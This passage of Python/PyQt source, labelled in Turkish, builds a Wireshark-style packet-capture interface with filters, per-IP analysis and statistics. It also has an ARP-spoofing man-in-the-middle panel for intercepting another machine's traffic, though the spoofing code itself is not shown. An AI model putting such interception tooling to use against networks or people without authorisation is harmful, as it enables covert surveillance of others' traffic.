        self.packet_table.setHorizontalHeaderLabels(["No","Zaman","Kaynak","Hedef","Protokol","Uzunluk","Bilgi"])
        self.packet_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.packet_table.horizontalHeader().setStretchLastSection(True)
        self.packet_table.horizontalHeader().resizeSection(0,60)   # No
        self.packet_table.horizontalHeader().resizeSection(1,90)   # Zaman
        self.packet_table.horizontalHeader().resizeSection(2,140)  # Kaynak
        self.packet_table.horizontalHeader().resizeSection(3,140)  # Hedef
        self.packet_table.horizontalHeader().resizeSection(4,80)   # Protokol
        self.packet_table.horizontalHeader().resizeSection(5,70)   # Uzunluk
        self.packet_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.packet_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.packet_table.itemSelectionChanged.connect(self.on_packet_selected)
        self.packet_table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:none;gridline-color:#1a1a2e;font-family:Consolas;font-size:11px;}
            QTableWidget::item{padding:4px 8px;border-bottom:1px solid #1a1a2e;}
            QTableWidget::item:selected{background:#0f3460;}
            QHeaderView::section{background:#16213e;color:#00ff88;padding:8px;border:none;border-bottom:2px solid #00ff88;font-weight:bold;font-size:11px;}
        """)
        main_splitter.addWidget(self.packet_table)
        
        # Alt panel - Detay ve İstatistikler
        bottom_widget=QWidget()
        bottom_layout=QHBoxLayout(bottom_widget)
        bottom_layout.setContentsMargins(0,0,0,0)
        bottom_layout.setSpacing(0)
        
        # Paket detayları
        detail_frame=QFrame()
        detail_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-radius:0;}")
        detail_layout=QVBoxLayout(detail_frame)
        detail_layout.setContentsMargins(10,10,10,10)
        
        detail_header=QLabel("📋 Paket Detayları")
        detail_header.setStyleSheet("color:#00ff88;font-weight:bold;font-size:12px;")
        detail_layout.addWidget(detail_header)
        
        self.detail_tree=QTreeWidget()
        self.detail_tree.setHeaderHidden(True)
        self.detail_tree.setStyleSheet("""
            QTreeWidget{background:#0a0a14;border:none;color:white;font-family:Consolas;font-size:11px;}
            QTreeWidget::item{padding:4px;}
            QTreeWidget::item:selected{background:#0f3460;}
            QTreeWidget::branch{background:#0a0a14;}
        """)
        detail_layout.addWidget(self.detail_tree)
        bottom_layout.addWidget(detail_frame,2)
        
        # İstatistikler paneli
        stats_frame=QFrame()
        stats_frame.setMaximumWidth(280)
        stats_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-left:none;}")
        stats_layout=QVBoxLayout(stats_frame)
        stats_layout.setContentsMargins(10,10,10,10)
        
        stats_header=QLabel("📊 İstatistikler")
        stats_header.setStyleSheet("color:#00ff88;font-weight:bold;font-size:12px;")
        stats_layout.addWidget(stats_header)
        
        # İstatistik değerleri
        self.stats_labels={}
        stats_grid=QGridLayout()
        stats_grid.setSpacing(8)
        
        stat_items=[
            ("total","Toplam Paket","#ffffff"),
            ("tcp","TCP","#5294e2"),
            ("udp","UDP","#73d216"),
            ("arp","ARP","#f5c211"),
            ("icmp","ICMP","#ad7fa8"),
            ("bytes","Veri (KB)","#00ff88")
        ]
        
        for i,(key,label,color) in enumerate(stat_items):
            lbl=QLabel(f"{label}:")
            lbl.setStyleSheet(f"color:{color};font-size:11px;")
            stats_grid.addWidget(lbl,i,0)
            
            val=QLabel("0")
            val.setStyleSheet(f"color:{color};font-weight:bold;font-size:13px;")
            val.setAlignment(Qt.AlignmentFlag.AlignRight)
            self.stats_labels[key]=val
            stats_grid.addWidget(val,i,1)
        
        stats_layout.addLayout(stats_grid)
        stats_layout.addSpacing(15)
        
        # Protokol dağılımı
        proto_header=QLabel("📈 Protokol Dağılımı")
        proto_header.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:11px;")
        stats_layout.addWidget(proto_header)
        
        self.proto_bars={}
        for proto in ['TCP','UDP','ARP','HTTP','DNS','OTHER']:
            row=QHBoxLayout()
            lbl=QLabel(proto)
            lbl.setFixedWidth(50)
            lbl.setStyleSheet(f"color:{PROTOCOL_COLORS.get(proto,'#555')};font-size:10px;")
            row.addWidget(lbl)
            
            bar=QProgressBar()
            bar.setMaximum(100)
            bar.setValue(0)
            bar.setTextVisible(False)
            bar.setFixedHeight(12)
            bar.setStyleSheet(f"""
                QProgressBar{{background:#1a1a2e;border:none;border-radius:3px;}}
                QProgressBar::chunk{{background:{PROTOCOL_COLORS.get(proto,'#555')};border-radius:3px;}}
            """)
            row.addWidget(bar)
            
            pct=QLabel("0%")
            pct.setFixedWidth(35)
            pct.setStyleSheet("color:#888;font-size:10px;")
            pct.setAlignment(Qt.AlignmentFlag.AlignRight)
            row.addWidget(pct)
            
            self.proto_bars[proto]=(bar,pct)
            stats_layout.addLayout(row)
        
        stats_layout.addStretch()
        
        # Durum
        self.capture_status=QLabel("⏸ Durduruldu")
        self.capture_status.setStyleSheet("color:#f39c12;font-size:11px;padding:5px;background:#1a1a2e;border-radius:4px;")
        self.capture_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
        stats_layout.addWidget(self.capture_status)
        
        bottom_layout.addWidget(stats_frame)
        
        main_splitter.addWidget(bottom_widget)
        main_splitter.setSizes([400,200])
        
        layout.addWidget(main_splitter)
    
    def toggle_capture(self):
        """Yakalamayı başlat/durdur"""
        if self.is_capturing:
            self.stop_capture()
        else:
            self.start_capture()
    
    def start_capture(self):
        """Yakalamayı başlat"""
        self.is_capturing=True
        self.capture_btn.setText("⏹ Durdur")
        self.capture_btn.setStyleSheet("""
            QPushButton{background:#e74c3c;color:white;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}
            QPushButton:hover{background:#c0392b;}
        """)
        self.capture_status.setText("🔴 Yakalama aktif...")
        self.capture_status.setStyleSheet("color:#00ff88;font-size:11px;padding:5px;background:#0f3460;border-radius:4px;")
        
        self.capture_thread=NetworkCaptureThread()
        self.capture_thread.packet_captured.connect(self.on_packet_captured)
        self.capture_thread.stats_updated.connect(self.on_stats_updated)
        self.capture_thread.error_occurred.connect(self.on_error)
        self.capture_thread.start()
    
    def stop_capture(self):
        """Yakalamayı durdur"""
        self.is_capturing=False
        self.capture_btn.setText("▶ Yakala")
        self.capture_btn.setStyleSheet("""
            QPushButton{background:#00ff88;color:#0a0a14;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}
            QPushButton:hover{background:#00cc6a;}
        """)
        self.capture_status.setText(f"⏸ Durduruldu - {len(self.packets)} paket")
        self.capture_status.setStyleSheet("color:#f39c12;font-size:11px;padding:5px;background:#1a1a2e;border-radius:4px;")
        
        if self.capture_thread:
            self.capture_thread.stop()
            self.capture_thread.wait()
            self.capture_thread=None
    
    def clear_packets(self):
        """Paketleri temizle"""
        self.packets.clear()
        self.filtered_packets.clear()
        self.packet_table.setRowCount(0)
        self.detail_tree.clear()
        
        # İstatistikleri sıfırla
        for key in self.stats_labels:
            self.stats_labels[key].setText("0")
        for proto,(bar,pct) in self.proto_bars.items():
            bar.setValue(0)
            pct.setText("0%")
    
    def on_packet_captured(self,packet):
        """Paket yakalandığında"""
        self.packets.append(packet)
        
        # Filtre kontrolü
        if self.matches_filter(packet):
            self.filtered_packets.append(packet)
            self.add_packet_to_table(packet)
    
    def add_packet_to_table(self,packet):
        """Paketi tabloya ekle"""
        row=self.packet_table.rowCount()
        self.packet_table.insertRow(row)
        
        # Protokol rengi
        proto_color=PROTOCOL_COLORS.get(packet.protocol,PROTOCOL_COLORS['UNKNOWN'])
        
        # Sütunları doldur
        items=[
            (str(packet.no),None),
            (f"{packet.timestamp:.3f}",None),
            (packet.source,"#aaa"),
            (packet.destination,"#aaa"),
            (packet.protocol,proto_color),
            (str(packet.length),None),
            (packet.info,None)
        ]
        
        for col,(text,color) in enumerate(items):
            item=QTableWidgetItem(text)
            if color:
                item.setForeground(QColor(color))
            if col==4:  # Protokol sütunu
                item.setBackground(QColor(proto_color).darker(250))
                item.setForeground(QColor(proto_color))
            item.setData(Qt.ItemDataRole.UserRole,packet)
            self.packet_table.setItem(row,col,item)
        
        # Otomatik scroll
        self.packet_table.scrollToBottom()
    
    def on_packet_selected(self):
        """Paket seçildiğinde detayları göster"""
        rows=self.packet_table.selectedIndexes()
        if not rows:return
        
        row=rows[0].row()
        item=self.packet_table.item(row,0)
        if not item:return
        
        packet=item.data(Qt.ItemDataRole.UserRole)
        if not packet:return
        
        self.selected_packet=packet
        self.show_packet_details(packet)
    
    def show_packet_details(self,packet):
        """Paket detaylarını göster"""
        self.detail_tree.clear()
        
        # Frame bilgisi
        frame=QTreeWidgetItem(self.detail_tree,[f"📦 Frame {packet.no}: {packet.length} bytes"])
        frame.setForeground(0,QColor("#00ff88"))
        QTreeWidgetItem(frame,[f"Yakalama zamanı: {packet.timestamp:.6f} sn"])
        QTreeWidgetItem(frame,[f"Uzunluk: {packet.length} bytes"])
        
        # Protokol bilgisi
        proto_color=PROTOCOL_COLORS.get(packet.protocol,'#888')
        proto=QTreeWidgetItem(self.detail_tree,[f"🔌 Protokol: {packet.protocol}"])
        proto.setForeground(0,QColor(proto_color))
        
        # Kaynak/Hedef
        src=QTreeWidgetItem(self.detail_tree,[f"📤 Kaynak: {packet.source}"])
        src.setForeground(0,QColor("#5294e2"))
        if packet.src_ip:
            QTreeWidgetItem(src,[f"IP: {packet.src_ip}"])
        if packet.src_port:
            QTreeWidgetItem(src,[f"Port: {packet.src_port}"])
        
        dst=QTreeWidgetItem(self.detail_tree,[f"📥 Hedef: {packet.destination}"])
        dst.setForeground(0,QColor("#e74c3c"))
        if packet.dst_ip:
            QTreeWidgetItem(dst,[f"IP: {packet.dst_ip}"])
        if packet.dst_port:
            QTreeWidgetItem(dst,[f"Port: {packet.dst_port}"])
        
        # Bilgi
        info=QTreeWidgetItem(self.detail_tree,[f"ℹ️ Bilgi: {packet.info}"])
        info.setForeground(0,QColor("#f39c12"))
        
        self.detail_tree.expandAll()
    
    def on_stats_updated(self,stats):
        """İstatistikler güncellendiğinde"""
        self.stats_labels['total'].setText(str(stats.get('total',0)))
        self.stats_labels['tcp'].setText(str(stats.get('tcp',0)))
        self.stats_labels['udp'].setText(str(stats.get('udp',0)))
        self.stats_labels['arp'].setText(str(stats.get('arp',0)))
        self.stats_labels['icmp'].setText(str(stats.get('icmp',0)))
        self.stats_labels['bytes'].setText(f"{stats.get('bytes',0)/1024:.1f}")
        
        # Protokol dağılımı
        total=stats.get('total',1) or 1
        tcp_pct=int(stats.get('tcp',0)*100/total)
        udp_pct=int(stats.get('udp',0)*100/total)
        arp_pct=int(stats.get('arp',0)*100/total)
        other_pct=max(0,100-tcp_pct-udp_pct-arp_pct)
        
        for proto,pct in [('TCP',tcp_pct),('UDP',udp_pct),('ARP',arp_pct),('OTHER',other_pct)]:
            if proto in self.proto_bars:
                bar,lbl=self.proto_bars[proto]
                bar.setValue(pct)
                lbl.setText(f"{pct}%")
    
    def on_error(self,error):
        """Hata oluştuğunda"""
        self.capture_status.setText(f"⚠️ {error[:30]}...")
        self.capture_status.setStyleSheet("color:#e74c3c;font-size:11px;padding:5px;background:#1a1a2e;border-radius:4px;")
    
    def set_quick_filter(self,filter_text):
        """Hızlı filtre uygula"""
        self.filter_input.setText(filter_text)
        self.apply_filter()
    
    def apply_filter(self):
        """Filtre uygula"""
        self.current_filter=self.filter_input.text().lower().strip()
        self.filtered_packets.clear()
        self.packet_table.setRowCount(0)
        
        for packet in self.packets:
            if self.matches_filter(packet):
                self.filtered_packets.append(packet)
                self.add_packet_to_table(packet)
    
    def matches_filter(self,packet):
        """Paketin filtreye uyup uymadığını kontrol et"""
        if not self.current_filter:
            return True
        
        f=self.current_filter
        
        # Protokol filtresi
        if f in ['tcp','udp','arp','icmp','http','https','dns','ssh','ftp','smtp']:
            return packet.protocol.lower()==f or f in packet.protocol.lower()
        
        # IP filtresi (ip==x.x.x.x)
        if f.startswith('ip==') or f.startswith('ip='):
            ip=f.split('=')[-1].strip()
            return ip in packet.src_ip or ip in packet.dst_ip
        
        # Port filtresi (port==xx)
        if f.startswith('port==') or f.startswith('port='):
            try:
                port=int(f.split('=')[-1].strip())
                return packet.src_port==port or packet.dst_port==port
            except:pass
        
        # Genel arama
        search_text=f"{packet.src_ip} {packet.dst_ip} {packet.protocol} {packet.info}".lower()
        return f in search_text

# Eski MonitoringWidget'ı uyumluluk için tut ama WiresharkWidget kullan
class MonitoringWidget(QWidget):
    """Deep Packet Inspection - Gerçek Zamanlı Ağ İzleme"""
    def __init__(self,parent=None):
        super().__init__(parent)
        self.monitor_thread=None
        self.is_monitoring=False
        self.packets=[]
        self.watched_ips={}  # {ip: {packets:[], stats:{}, first_seen, last_seen}}
        self.targets=[]
        self.security_alerts=[]  # Güvenlik uyarıları
        self.arp_spoof_thread=None  # ARP Spoofing thread
        self.is_arp_spoofing=False
        self.selected_watch_ip=None
        self.setup_ui()
    
    def setup_ui(self):
        layout=QVBoxLayout(self)
        layout.setContentsMargins(0,0,0,0)
        layout.setSpacing(0)
        
        # ===== ÜST BAR (Kompakt) =====
        top_bar=QFrame()
        top_bar.setMaximumHeight(55)
        top_bar.setStyleSheet("QFrame{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #1a1a2e,stop:1 #16213e);border-bottom:2px solid #00ff88;}")
        top_layout=QHBoxLayout(top_bar)
        top_layout.setContentsMargins(10,5,10,5)
        top_layout.setSpacing(8)
        
        # Başlat butonu
        self.main_btn=QPushButton("▶ YAKALAMAYA BAŞLA")
        self.main_btn.setFixedHeight(35)
        self.main_btn.setStyleSheet("""
            QPushButton{background:#00ff88;color:#0a0a14;padding:8px 20px;border:none;border-radius:6px;font-weight:bold;font-size:12px;}
            QPushButton:hover{background:#00cc6a;}
        """)
        self.main_btn.clicked.connect(self.toggle_monitoring)
        top_layout.addWidget(self.main_btn)
        
        clear_btn=QPushButton("🗑 Temizle")
        clear_btn.setFixedHeight(35)
        clear_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:8px 12px;border:none;border-radius:6px;font-size:11px;}QPushButton:hover{background:#16213e;}")
        clear_btn.clicked.connect(self.clear_all)
        top_layout.addWidget(clear_btn)
        
        top_layout.addSpacing(10)
        
        # IP İzleme girişi
        ip_frame=QFrame()
        ip_frame.setStyleSheet("QFrame{background:#0f3460;border-radius:6px;padding:2px;}")
        ip_layout=QHBoxLayout(ip_frame)
        ip_layout.setContentsMargins(8,3,8,3)
        ip_layout.setSpacing(5)
        
        ip_layout.addWidget(QLabel("🎯 IP İzle:"))
        self.ip_input=QLineEdit()
        self.ip_input.setPlaceholderText("192.168.1.100")
        self.ip_input.setFixedWidth(120)
        self.ip_input.setStyleSheet("QLineEdit{background:#0a0a14;color:#00ff88;border:1px solid #00ff88;border-radius:4px;padding:4px;font-size:11px;}")
        self.ip_input.returnPressed.connect(self.add_watch_ip)
        ip_layout.addWidget(self.ip_input)
        
        add_ip_btn=QPushButton("➕ Ekle")
        add_ip_btn.setStyleSheet("QPushButton{background:#00ff88;color:#0a0a14;padding:4px 10px;border:none;border-radius:4px;font-weight:bold;font-size:10px;}QPushButton:hover{background:#00cc6a;}")
        add_ip_btn.clicked.connect(self.add_watch_ip)
        ip_layout.addWidget(add_ip_btn)
        
        # Kendi IP'mi ekle butonu
        my_ip_btn=QPushButton("🖥️ Bu PC")
        my_ip_btn.setStyleSheet("QPushButton{background:#0f3460;color:#00d4ff;padding:4px 8px;border:1px solid #00d4ff;border-radius:4px;font-size:9px;}QPushButton:hover{background:#16213e;}")
        my_ip_btn.setToolTip("Bu bilgisayarın IP'sini izlemeye ekle")
        my_ip_btn.clicked.connect(self.add_my_ip)
        ip_layout.addWidget(my_ip_btn)
        
        # Tüm trafiği göster checkbox
        self.show_all_traffic=QCheckBox("Tümü")
        self.show_all_traffic.setStyleSheet("QCheckBox{color:#f39c12;font-size:11px;}QCheckBox::indicator{width:16px;height:16px;}")
        self.show_all_traffic.setToolTip("İşaretlenirse tüm ağ trafiği gösterilir")
        self.show_all_traffic.stateChanged.connect(self.on_show_all_changed)
        ip_layout.addWidget(self.show_all_traffic)
        
        top_layout.addWidget(ip_frame)
        
        top_layout.addStretch()
        
        # Durum
        self.status_label=QLabel("⏸ Durduruldu")
        self.status_label.setStyleSheet("color:#f39c12;font-weight:bold;font-size:12px;")
        top_layout.addWidget(self.status_label)
        
        self.packet_count=QLabel("📦 0")
        self.packet_count.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:14px;margin-left:15px;")
        top_layout.addWidget(self.packet_count)
        
        layout.addWidget(top_bar)
        
        # ===== ANA İÇERİK =====
        main_splitter=QSplitter(Qt.Orientation.Horizontal)
        main_splitter.setStyleSheet("QSplitter::handle{background:#0f3460;width:3px;}")
        
        # ===== SOL - Aktivite & İzleme (Scrollable) =====
        left_scroll=QScrollArea()
        left_scroll.setWidgetResizable(True)
        left_scroll.setMinimumWidth(380)
        left_scroll.setMaximumWidth(450)
        left_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        left_scroll.setStyleSheet("""
            QScrollArea{background:#0d0d1a;border:none;}
            QScrollBar:vertical{background:#0a0a14;width:6px;border-radius:3px;}
            QScrollBar::handle:vertical{background:#0f3460;border-radius:3px;min-height:30px;}
            QScrollBar::handle:vertical:hover{background:#00ff88;}
        """)
        
        left_panel=QFrame()
        left_panel.setStyleSheet("QFrame{background:#0d0d1a;}")
        left_layout=QVBoxLayout(left_panel)
        left_layout.setContentsMargins(6,6,6,6)
        left_layout.setSpacing(5)
        
        # ===== AKTİVİTE LOG - ANA BÖLÜM =====
        activity_header=QLabel("📊 CANLI AKTİVİTE LOG")
        activity_header.setStyleSheet("color:#00ff88;font-weight:bold;font-size:12px;padding:8px;background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #16213e,stop:1 #1a1a2e);border-radius:6px;border-left:3px solid #00ff88;")
        left_layout.addWidget(activity_header)
        
        self.activity_list=QListWidget()
        self.activity_list.setMinimumHeight(180)
        self.activity_list.setMaximumHeight(220)
        self.activity_list.setStyleSheet("""
            QListWidget{
                background:#0a0a14;
                border:1px solid #0f3460;
                border-radius:6px;
                font-family:Consolas;
                font-size:10px;
                padding:3px;
            }
            QListWidget::item{
                padding:5px 8px;
                border-bottom:1px solid #1a1a2e;
                border-radius:3px;
                margin:1px 0;
            }
            QListWidget::item:hover{
                background:#16213e;
            }
        """)
        left_layout.addWidget(self.activity_list,1)
        
        # Aktivite istatistikleri
        stats_frame=QFrame()
        stats_frame.setStyleSheet("QFrame{background:#16213e;border-radius:6px;padding:8px;}")
        stats_layout=QHBoxLayout(stats_frame)
        stats_layout.setContentsMargins(10,8,10,8)
        
        self.stat_total=QLabel("📦 Toplam: 0")
        self.stat_total.setStyleSheet("color:#00d4ff;font-weight:bold;")
        stats_layout.addWidget(self.stat_total)
        
        self.stat_tcp=QLabel("🔵 TCP: 0")
        self.stat_tcp.setStyleSheet("color:#5294e2;")
        stats_layout.addWidget(self.stat_tcp)
        
        self.stat_udp=QLabel("🟢 UDP: 0")
        self.stat_udp.setStyleSheet("color:#73d216;")
        stats_layout.addWidget(self.stat_udp)
        
        self.stat_arp=QLabel("🟡 ARP: 0")
        self.stat_arp.setStyleSheet("color:#f5c211;")
        stats_layout.addWidget(self.stat_arp)
        
        left_layout.addWidget(stats_frame)
        
        # ===== İZLENEN IP'LER =====
        watch_header=QLabel("🎯 İZLENEN IP'LER (Sağ tık: Detaylı Analiz)")
        watch_header.setStyleSheet("color:#e74c3c;font-weight:bold;font-size:12px;padding:8px;background:#16213e;border-radius:4px;border-left:4px solid #e74c3c;")
        left_layout.addWidget(watch_header)
        
        self.watch_list=QListWidget()
        self.watch_list.setMaximumHeight(100)
        self.watch_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.watch_list.customContextMenuRequested.connect(self.show_watch_menu)
        self.watch_list.itemClicked.connect(self.on_watch_selected)
        self.watch_list.itemDoubleClicked.connect(self.show_ip_analysis)
        self.watch_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:6px;font-family:Consolas;font-size:11px;}
            QListWidget::item{padding:8px;border-bottom:1px solid #1a1a2e;color:#00ff88;}
            QListWidget::item:selected{background:#0f3460;color:#00ff88;}
            QListWidget::item:hover{background:#16213e;}
        """)
        left_layout.addWidget(self.watch_list)
        
        # ===== PROFESYONEl IP ANALİZ PANELİ =====
        self.ip_analysis_frame=QFrame()
        self.ip_analysis_frame.setStyleSheet("""
            QFrame{background:qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #1a1a2e,stop:1 #0d0d1a);
                   border:2px solid #00ff88;border-radius:10px;padding:10px;}
        """)
        analysis_layout=QVBoxLayout(self.ip_analysis_frame)
        analysis_layout.setSpacing(8)
        
        # Analiz başlığı
        self.analysis_title=QLabel("📊 IP ANALİZ RAPORU")
        self.analysis_title.setStyleSheet("color:#00ff88;font-weight:bold;font-size:14px;padding:5px;")
        analysis_layout.addWidget(self.analysis_title)
        
        # Güvenlik skoru
        score_frame=QFrame()
        score_frame.setStyleSheet("QFrame{background:#0a0a14;border-radius:6px;padding:8px;}")
        score_layout=QHBoxLayout(score_frame)
        score_layout.setContentsMargins(5,5,5,5)
        
        self.security_score_label=QLabel("GÜVENLİK SKORU")
        self.security_score_label.setStyleSheet("color:#888;font-size:10px;")
        score_layout.addWidget(self.security_score_label)
        
        self.security_score=QLabel("--")
        self.security_score.setStyleSheet("color:#00ff88;font-size:24px;font-weight:bold;")
        score_layout.addWidget(self.security_score)
        
        self.security_status=QLabel("Analiz bekleniyor...")
        self.security_status.setStyleSheet("color:#888;font-size:11px;")
        score_layout.addWidget(self.security_status)
        score_layout.addStretch()
        
        analysis_layout.addWidget(score_frame)
        
        # İstatistikler grid
        stats_grid=QGridLayout()
        stats_grid.setSpacing(5)
        
        # Row 0
        self.stat_ip=QLabel("IP: -")
        self.stat_ip.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:12px;")
        stats_grid.addWidget(self.stat_ip,0,0,1,2)
        
        # Row 1
        self.stat_packets=QLabel("📦 Toplam Paket: 0")
        self.stat_packets.setStyleSheet("color:#fff;font-size:11px;")
        stats_grid.addWidget(self.stat_packets,1,0)
        
        self.stat_bytes=QLabel("📊 Veri: 0 KB")
        self.stat_bytes.setStyleSheet("color:#fff;font-size:11px;")
        stats_grid.addWidget(self.stat_bytes,1,1)
        
        # Row 2
        self.stat_first=QLabel("⏱ İlk: -")
        self.stat_first.setStyleSheet("color:#888;font-size:10px;")
        stats_grid.addWidget(self.stat_first,2,0)
        
        self.stat_last=QLabel("⏱ Son: -")
        self.stat_last.setStyleSheet("color:#888;font-size:10px;")
        stats_grid.addWidget(self.stat_last,2,1)
        
        analysis_layout.addLayout(stats_grid)
        
        # Protokol dağılımı
        proto_header=QLabel("📡 PROTOKOL DAĞILIMI")
        proto_header.setStyleSheet("color:#f39c12;font-weight:bold;font-size:11px;margin-top:5px;")
        analysis_layout.addWidget(proto_header)
        
        self.proto_bars=QFrame()
        self.proto_bars.setStyleSheet("QFrame{background:#0a0a14;border-radius:4px;padding:5px;}")
        self.proto_layout=QVBoxLayout(self.proto_bars)
        self.proto_layout.setSpacing(3)
        analysis_layout.addWidget(self.proto_bars)
        
        # Domain listesi
        domain_header=QLabel("🌐 BAĞLANILAN DOMAIN'LER")
        domain_header.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:11px;margin-top:5px;")
        analysis_layout.addWidget(domain_header)
        
        self.domain_list=QListWidget()
        self.domain_list.setMaximumHeight(80)
        self.domain_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:4px;font-size:10px;}
            QListWidget::item{padding:3px;color:#00d4ff;}
        """)
        analysis_layout.addWidget(self.domain_list)
        
        # Port listesi
        port_header=QLabel("🔌 KULLANILAN PORTLAR")
        port_header.setStyleSheet("color:#e74c3c;font-weight:bold;font-size:11px;margin-top:5px;")
        analysis_layout.addWidget(port_header)
        
        self.port_list=QLabel("-")
        self.port_list.setStyleSheet("color:#e74c3c;font-size:10px;background:#0a0a14;border-radius:4px;padding:5px;")
        self.port_list.setWordWrap(True)
        analysis_layout.addWidget(self.port_list)
        
        # Risk analizi
        risk_header=QLabel("⚠️ RİSK ANALİZİ")
        risk_header.setStyleSheet("color:#ff6b6b;font-weight:bold;font-size:11px;margin-top:5px;")
        analysis_layout.addWidget(risk_header)
        
        self.risk_list=QListWidget()
        self.risk_list.setMaximumHeight(60)
        self.risk_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:4px;font-size:10px;}
            QListWidget::item{padding:3px;}
        """)
        analysis_layout.addWidget(self.risk_list)
        
        # Sadece bu IP'yi göster butonu
        self.filter_only_btn=QPushButton("🎯 SADECE BU IP'Yİ GÖSTER")
        self.filter_only_btn.setStyleSheet("""
            QPushButton{background:#e74c3c;color:white;padding:8px;border:none;border-radius:6px;font-weight:bold;}
            QPushButton:hover{background:#c0392b;}
        """)
        self.filter_only_btn.clicked.connect(self.filter_watched_ip_only)
        analysis_layout.addWidget(self.filter_only_btn)
        
        left_layout.addWidget(self.ip_analysis_frame,1)
        
        # ===== ARP SPOOFING (MITM) PANELİ =====
        arp_frame=QFrame()
        arp_frame.setStyleSheet("""
            QFrame{background:qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #2a1a0a,stop:1 #1a0a0a);
                   border:2px solid #ff6600;border-radius:10px;padding:8px;}
        """)
        arp_layout=QVBoxLayout(arp_frame)
        arp_layout.setSpacing(6)
        
        arp_header=QLabel("🕵️ ARP SPOOFING (MITM)")
        arp_header.setStyleSheet("color:#ff6600;font-weight:bold;font-size:12px;")
        arp_layout.addWidget(arp_header)
        
        arp_info=QLabel("⚠️ Farklı bilgisayarın trafiğini izlemek için")
        arp_info.setStyleSheet("color:#888;font-size:9px;")
        arp_layout.addWidget(arp_info)
        
        # Hedef IP
        target_layout=QHBoxLayout()
        target_layout.addWidget(QLabel("🎯 Hedef:"))
        self.arp_target_ip=QLineEdit()
        self.arp_target_ip.setPlaceholderText("10.248.63.93")
        self.arp_target_ip.setStyleSheet("QLineEdit{background:#0a0a14;color:#ff6600;border:1px solid #ff6600;border-radius:4px;padding:4px;font-size:11px;}")
        target_layout.addWidget(self.arp_target_ip)
        arp_layout.addLayout(target_layout)
        
        # Gateway IP
        gw_layout=QHBoxLayout()
        gw_layout.addWidget(QLabel("🌐 Gateway:"))
        self.arp_gateway_ip=QLineEdit()
        self.arp_gateway_ip.setPlaceholderText("10.248.63.1")
        self.arp_gateway_ip.setStyleSheet("QLineEdit{background:#0a0a14;color:#ff6600;border:1px solid #ff6600;border-radius:4px;padding:4px;font-size:11px;}")
        gw_layout.addWidget(self.arp_gateway_ip)
        arp_layout.addLayout(gw_layout)
        
        # Gateway'i otomatik bul butonu
        detect_gw_btn=QPushButton("🔍 Gateway Bul")
        detect_gw_btn.setStyleSheet("QPushButton{background:#0f3460;color:#00d4ff;padding:4px;border:1px solid #00d4ff;border-radius:4px;font-size:10px;}QPushButton:hover{background:#16213e;}")
        detect_gw_btn.clicked.connect(self.detect_gateway)
        arp_layout.addWidget(detect_gw_btn)
        
        # ARP Spoof başlat/durdur butonu
        self.arp_spoof_btn=QPushButton("🕵️ MITM BAŞLAT")
        self.arp_spoof_btn.setStyleSheet("""
            QPushButton{background:#ff6600;color:white;padding:8px;border:none;border-radius:6px;font-weight:bold;}
            QPushButton:hover{background:#cc5200;}
        """)
        self.arp_spoof_btn.clicked.connect(self.toggle_arp_spoof)
        arp_layout.addWidget(self.arp_spoof_btn)
        
        # Durum
        self.arp_status=QLabel("⏸ Pasif")
        self.arp_status.setStyleSheet("color:#888;font-size:10px;")
        arp_layout.addWidget(self.arp_status)
        
        # Uyarı
        warning=QLabel("⚠️ Sadece kendi cihazlarınızda kullanın!")
        warning.setStyleSheet("color:#ff4444;font-size:9px;font-style:italic;")
        arp_layout.addWidget(warning)
        
        left_layout.addWidget(arp_frame)
        
        # Sol paneli scroll'a ekle
        left_scroll.setWidget(left_panel)
        main_splitter.addWidget(left_scroll)
        
        # ===== SAĞ - Paket Listesi =====
        right_panel=QFrame()
        right_panel.setStyleSheet("QFrame{background:#0a0a14;}")
        right_layout=QVBoxLayout(right_panel)
        right_layout.setContentsMargins(6,6,6,6)
        right_layout.setSpacing(5)
        
        # Filtre
        filter_bar=QHBoxLayout()
        filter_bar.setSpacing(5)
        filter_bar.addWidget(QLabel("🔍"))
        
        self.filter_input=QLineEdit()
        self.filter_input.setPlaceholderText("Filtre... (ip, protokol, port)")
        self.filter_input.setStyleSheet("QLineEdit{background:#16213e;color:#00ff88;border:1px solid #0f3460;border-radius:5px;padding:6px;font-size:11px;}")
        self.filter_input.textChanged.connect(self.apply_filter)
        filter_bar.addWidget(self.filter_input,1)
        
        for name,color in [("TCP","#5294e2"),("UDP","#73d216"),("ARP","#f5c211")]:
            btn=QPushButton(name)
            btn.setFixedHeight(28)
            btn.setStyleSheet(f"QPushButton{{background:{color};color:white;padding:6px 12px;border:none;border-radius:4px;font-weight:bold;}}QPushButton:hover{{opacity:0.8;}}")
            btn.clicked.connect(lambda _,n=name.lower():self.filter_input.setText(n))
            filter_bar.addWidget(btn)
        
        right_layout.addLayout(filter_bar)
        
        # Paket tablosu
        packet_header=QLabel("📦 YAKALANAN PAKETLER (Sağ tık → IP İzle)")
        packet_header.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:12px;padding:5px;background:#16213e;border-radius:4px;")
        right_layout.addWidget(packet_header)
        
        self.packet_table=QTableWidget()
        self.packet_table.setColumnCount(8)
